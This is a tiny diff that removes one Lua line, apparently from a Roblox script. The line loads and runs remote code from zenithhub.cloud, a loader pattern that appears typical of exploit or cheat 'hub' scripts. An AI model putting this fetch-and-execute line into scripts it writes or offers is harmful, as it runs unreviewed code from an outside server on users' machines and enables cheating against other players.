@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://zenithhub.cloud/panel/script"))()
